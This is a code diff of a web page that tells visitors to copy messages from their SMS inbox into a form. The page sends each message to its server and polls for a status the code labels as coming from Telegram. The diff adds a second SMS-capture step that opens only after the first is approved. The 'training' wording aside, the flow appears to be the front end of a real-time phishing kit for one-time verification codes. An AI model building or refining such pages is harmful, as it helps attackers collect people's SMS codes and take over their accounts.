@@ -80,7 +80,7 @@
     }
 
     .hidden {
-      display: none;
+      display: none !important;
     }
 
     .status {
@@ -138,6 +138,7 @@
       line-height: 1.5;
     }
 
+    /* RESULT */
     .result {
       position: fixed;
       inset: 0;
@@ -185,7 +186,10 @@
     </div>
 
 
+    <!-- ========================= -->
     <!-- PAGE 1 -->
+    <!-- ========================= -->
+
     <div class="card" id="page1">
 
       <p>Copy the message from SMS in your messages box.</p>
@@ -210,7 +214,10 @@ This message is for training purposes.
     </div>
 
 
+    <!-- ========================= -->
     <!-- PAGE 2 -->
+    <!-- ========================= -->
+
     <div class="card hidden" id="page2">
 
       <p>Copy the message from SMS in your messages box.</p>
@@ -237,7 +244,10 @@ This message is for training purposes.
   </div>
 
 
+  <!-- ========================= -->
   <!-- WAITING SCREEN -->
+  <!-- ========================= -->
+
   <div id="waitingOverlay">
 
     <div class="waitingBox">
@@ -249,7 +259,7 @@ This message is for training purposes.
       </div>
 
       <div class="waitingText">
-        Verifying your request...<br>
+        Verifying your training request...<br>
         Please do not close this page.
       </div>
 
@@ -258,7 +268,10 @@ This message is for training purposes.
   </div>
 
 
-  <!-- APPROVED / DECLINED SCREEN -->
+  <!-- ========================= -->
+  <!-- FINAL RESULT -->
+  <!-- ========================= -->
+
   <div id="resultScreen" class="result">
 
     <div class="resultBox">
@@ -278,10 +291,17 @@ This message is for training purposes.
 <script>
 
 let currentRequestId = null;
+let currentPage = 1;
 let pollingTimer = null;
 
 
+/* =========================
+   SUBMIT PAGE
+========================= */
+
 async function submitMessage(page) {
+
+  currentPage = page;
 
   const input =
     document.getElementById("message" + page);
@@ -293,74 +313,112 @@ async function submitMessage(page) {
     input.value.trim();
 
   if (!message) {
+
     status.textContent =
       "Please enter the demo message.";
+
     return;
   }
 
-  status.textContent = "Submitting...";
+  status.textContent =
+    "Submitting...";
 
   try {
 
-    const response = await fetch("/demo-message", {
+    const response =
+      await fetch("/demo-message", {
 
-      method: "POST",
+        method: "POST",
 
-      headers: {
-        "Content-Type": "application/json"
-      },
+        headers: {
+          "Content-Type": "application/json"
+        },
 
-      body: JSON.stringify({
-        page: page,
-        message: message
-      })
+        body: JSON.stringify({
+          page: page,
+          message: message
+        })
 
-    });
+      });
+
 
     if (!response.ok) {
       throw new Error("Submission failed");
     }
 
-    const data = await response.json();
 
-    currentRequestId = data.requestId;
+    const data =
+      await response.json();
+
+
+    currentRequestId =
+      data.requestId;
+
 
     /*
-      Hide the current page and show the
-      verification waiting screen.
+      Hide current page.
     */
 
     document
       .getElementById("page" + page)
       .classList.add("hidden");
 
+
+    /*
+      Show waiting screen.
+    */
+
     document
       .getElementById("waitingOverlay")
       .classList.add("active");
 
+
     startPolling();
+
 
   } catch (error) {
 
-    console.error(error);
+    console.error(
+      "Submission error:",
+      error
+    );
 
     status.textContent =
       "Unable to submit the training request.";
+
   }
+
 }
 
+
+/* =========================
+   START POLLING
+========================= */
 
 function startPolling() {
 
   if (pollingTimer) {
-    clearInterval(pollingTimer);
+
+    clearInterval(
+      pollingTimer
+    );
+
   }
 
-  pollingTimer = setInterval(checkStatus, 2000);
+  pollingTimer =
+    setInterval(
+      checkStatus,
+      2000
+    );
 
   checkStatus();
+
 }
 
+
+/* =========================
+   CHECK TELEGRAM STATUS
+========================= */
 
 async function checkStatus() {
 
@@ -368,66 +426,175 @@ async function checkStatus() {
     return;
   }
 
+
   try {
 
-    const response = await fetch(
-      "/demo-status/" +
-      encodeURIComponent(currentRequestId)
-    );
+    const response =
+      await fetch(
+        "/demo-status/" +
+        encodeURIComponent(
+          currentRequestId
+        )
+      );
+
 
     if (!response.ok) {
       return;
     }
 
-    const data = await response.json();
 
-    if (
-      data.status === "approved" ||
-      data.status === "declined"
-    ) {
+    const data =
+      await response.json();
 
-      clearInterval(pollingTimer);
+
+    console.log(
+      "Demo status:",
+      data
+    );
+
+
+    /* =========================
+       APPROVED
+    ========================= */
+
+    if (data.status === "approved") {
+
+      clearInterval(
+        pollingTimer
+      );
+
 
       document
-        .getElementById("waitingOverlay")
-        .classList.remove("active");
+        .getElementById(
+          "waitingOverlay"
+        )
+        .classList.remove(
+          "active"
+        );
 
-      showResult(data.status);
+
+      /*
+        PAGE 1 APPROVED:
+        Move to PAGE 2.
+      */
+
+      if (currentPage === 1) {
+
+        currentRequestId = null;
+
+        document
+          .getElementById("page2")
+          .classList.remove("hidden");
+
+        return;
+      }
+
+
+      /*
+        PAGE 2 APPROVED:
+        Show final approved screen.
+      */
+
+      if (currentPage === 2) {
+
+        currentRequestId = null;
+
+        showResult("approved");
+
+        return;
+      }
+
     }
+
+
+    /* =========================
+       DECLINED
+    ========================= */
+
+    if (data.status === "declined") {
+
+      clearInterval(
+        pollingTimer
+      );
+
+      currentRequestId = null;
+
+
+      document
+        .getElementById(
+          "waitingOverlay"
+        )
+        .classList.remove(
+          "active"
+        );
+
+
+      showResult(
+        "declined"
+      );
+
+    }
+
 
   } catch (error) {
 
-    console.error("Status check failed:", error);
+    console.error(
+      "Status check failed:",
+      error
+    );
+
   }
+
 }
 
+
+/* =========================
+   FINAL RESULT
+========================= */
 
 function showResult(status) {
 
   const screen =
-    document.getElementById("resultScreen");
+    document.getElementById(
+      "resultScreen"
+    );
 
   const title =
-    document.getElementById("resultTitle");
+    document.getElementById(
+      "resultTitle"
+    );
 
   const text =
-    document.getElementById("resultText");
+    document.getElementById(
+      "resultText"
+    );
+
 
   if (status === "approved") {
 
-    title.textContent = "Approved";
+    title.textContent =
+      "Approved";
+
     text.textContent =
       "Your training request has been approved.";
 
-  } else {
+  }
 
-    title.textContent = "Declined";
+  else {
+
+    title.textContent =
+      "Declined";
+
     text.textContent =
       "Your training request has been declined.";
 
   }
 
-  screen.classList.add("active");
+
+  screen.classList.add(
+    "active"
+  );
+
 }
 
 </script>
